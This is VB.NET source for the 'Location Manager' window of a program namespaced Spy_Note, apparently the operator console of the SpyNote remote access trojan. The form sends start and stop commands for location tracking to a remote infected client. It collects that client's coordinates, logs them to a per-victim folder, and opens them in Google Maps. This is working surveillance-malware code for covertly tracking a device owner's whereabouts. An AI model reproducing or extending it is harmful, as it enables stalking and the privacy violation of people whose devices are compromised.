Imports System.ComponentModel
Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Location_Manager
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Ary}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim index As Integer = Me.imageList_0.Images.IndexOfKey("location".ToUpper())
                    Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(index), array2(0), array2(1), array2(2)})
                    stringBuilder.AppendFormat("{0}", String.Concat(New String() {array2(0), " , ", array2(1), " , ", array2(2), vbCrLf}))
                    store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Location_Manager", stringBuilder.ToString())
                    Me.ToEnd()
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                    Me.refres_title()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
    End Sub

    Private Sub Location_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ListenerStopToolStripMenuItem.Image = store_0.Bitmap_0("ctx_lstnStop")
        Me.ListenerStartToolStripMenuItem.Image = store_0.Bitmap_0("ctx_lstnPlay")
        Me.ChromeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        Me.FirefoxToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        Me.DefaultToolStripMenuItem.Image = store_0.Bitmap_0("ctx_maps")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\location_manager\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Location Manager - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Private Sub ListenerStopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListenerStopToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "location_manager_stop")
    End Sub

    Private Sub ListenerStartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListenerStartToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "location_manager")
    End Sub

    Private Sub Browsers(Browser As String)
        Try
            Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
            If flag Then
                Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
                For i As Integer = num To 0 Step -1
                    Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                    Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)
                    Dim text3 As String = String.Concat(New String() {"https://www.google.com/maps/dir/", text, ",", text2, "/@", text, ",", text2, ",16.01z"})
                    Dim flag2 As Boolean = Operators.CompareString(Browser, "default", False) = 0
                    If flag2 Then
                        Process.Start(text3)
                    Else
                        Process.Start(Browser, text3)
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ChromeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChromeToolStripMenuItem.Click
        Me.Browsers("chrome.exe")
    End Sub

    Private Sub FirefoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FirefoxToolStripMenuItem.Click
        Me.Browsers("firefox.exe")
    End Sub

    Private Sub Location_Manager_Closing(sender As Object, e As CancelEventArgs) Handles Me.FormClosing
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "location_manager_stop")
    End Sub

    Private Sub DefaultToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DefaultToolStripMenuItem.Click
        Me.Browsers("default")
    End Sub

End Class